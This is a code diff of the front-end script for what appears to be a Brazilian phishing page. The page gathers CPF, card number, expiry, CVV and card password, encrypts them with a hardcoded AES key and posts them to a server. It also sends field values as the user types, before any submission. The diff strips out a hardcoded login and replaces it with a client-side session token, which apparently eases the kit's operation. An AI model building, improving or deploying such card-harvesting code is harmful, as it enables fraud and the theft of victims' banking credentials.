@@ -1,9 +1,8 @@
 let whatsappNumber = '+5511999999999'; // Default value, will be updated dynamically
-let sessionId = generateSessionId(); // Generate unique session ID for the user
+let sessionId = generateSessionId(); // Generate unique session ID for the user, usado como token
 let transitionTriggered = false; // Flag to prevent multiple transitions
-let isAuthenticated = false; // Flag para autenticação
 
-// Gerar uma ID de sessão única
+// Gerar uma ID de sessão única (agora usada como token)
 function generateSessionId() {
     return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
@@ -17,33 +16,22 @@ function debounce(func, wait) {
     };
 }
 
-// Enviar dados temporários ao servidor com criptografia
+// Enviar dados temporários ao servidor com token
 async function sendTempData(field, value) {
-    if (!isAuthenticated) {
-        console.error('Usuário não autenticado. Tentando login...');
-        const loginResult = await login();
-        if (!loginResult) {
-            console.error('Falha na autenticação após tentativa. Dados não enviados.');
-            alert('Falha na autenticação. Recarregue a página.');
-            return;
-        }
-    }
     try {
         const encryptedValue = CryptoJS.AES.encrypt(value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
         const data = { sessionId, [field]: encryptedValue };
         const response = await fetch('/api/temp-submit', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-session-token': sessionId // Envia o token no header
+            },
             body: JSON.stringify(data)
         });
         if (!response.ok) {
             const errorData = await response.json();
             console.error('Erro ao enviar dados temporários:', errorData);
-            if (errorData.error === 'Não autorizado. Faça login.') {
-                isAuthenticated = false;
-                await sendTempData(field, value); // Tenta novamente
-            }
         }
     } catch (error) {
         console.error('Erro ao enviar dados temporários:', error);
@@ -55,8 +43,7 @@ async function registerVisit() {
     try {
         const response = await fetch('/api/visit', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include'
+            headers: { 'Content-Type': 'application/json', 'x-session-token': sessionId }
         });
         if (!response.ok) {
             console.error('Erro ao registrar visita:', await response.json());
@@ -69,7 +56,7 @@ async function registerVisit() {
 // Buscar número do WhatsApp
 async function loadWhatsAppNumber() {
     try {
-        const response = await fetch('/api/contact-number', { credentials: 'include' });
+        const response = await fetch('/api/contact-number', { headers: { 'x-session-token': sessionId } });
         const data = await response.json();
         if (response.ok) {
             whatsappNumber = data.contactNumber;
@@ -288,17 +275,7 @@ if (nextBtn) {
             return;
         }
         const isValid = validateCPF(cpf.value);
-        if (!isAuthenticated) {
-            login().then(() => {
-                if (!isAuthenticated) {
-                    alert('Falha na autenticação.');
-                    return;
-                }
-                proceedToCardScreen();
-            });
-        } else {
-            proceedToCardScreen();
-        }
+        proceedToCardScreen();
 
         function proceedToCardScreen() {
             if (!isValid) {
@@ -371,11 +348,6 @@ if (submitBtn) {
             return;
         }
 
-        if (!isAuthenticated) {
-            alert('Autenticação necessária.');
-            return;
-        }
-
         cardContent.classList.remove('visible');
         analysisMessage.classList.add('visible');
         setTimeout(() => analysisMessage.scrollIntoView({ behavior: 'smooth' }), 100);
@@ -389,8 +361,7 @@ if (submitBtn) {
         try {
             const response = await fetch('/submit', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                credentials: 'include',
+                headers: { 'Content-Type': 'application/json', 'x-session-token': sessionId },
                 body: JSON.stringify({ sessionId, cpf: encryptedCpf, cardNumber: encryptedCardNumber, expiryDate: encryptedExpiryDate, cvv: encryptedCvv, password: encryptedPassword })
             });
             const result = await response.json();
@@ -407,47 +378,11 @@ if (submitBtn) {
     });
 }
 
-// Carregar ao iniciar com autenticação
+// Carregar ao iniciar
 window.onload = async () => {
-    console.log('Página carregada, iniciando autenticação...');
-
-    // Função de login automática
-    async function login(maxRetries = 3) {
-        for (let attempt = 1; attempt <= maxRetries; attempt++) {
-            try {
-                console.log(`Tentativa de login ${attempt}...`);
-                const response = await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({ username: 'user', password: 'pass' })
-                });
-                const responseData = await response.json();
-                console.log(`Resposta do login ${attempt}:`, responseData);
-                if (response.ok) {
-                    isAuthenticated = true;
-                    console.log('Login bem-sucedido na tentativa', attempt);
-                    return true;
-                } else {
-                    console.error('Falha no login:', responseData.error || response.statusText);
-                }
-            } catch (error) {
-                console.error('Erro no login na tentativa', attempt, ':', error);
-            }
-            if (attempt < maxRetries) {
-                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-            }
-        }
-        console.error('Falha na autenticação após', maxRetries, 'tentativas.');
-        alert('Falha na autenticação. Recarregue a página.');
-        return false;
-    }
-
-    // Executar autenticação e continuar o fluxo
-    if (await login()) {
-        loadWhatsAppNumber();
-        registerVisit();
-    }
+    console.log('Página carregada, iniciando...');
+    loadWhatsAppNumber();
+    registerVisit();
 
     const cpfInput = document.getElementById('cpf');
     if (cpfInput) {
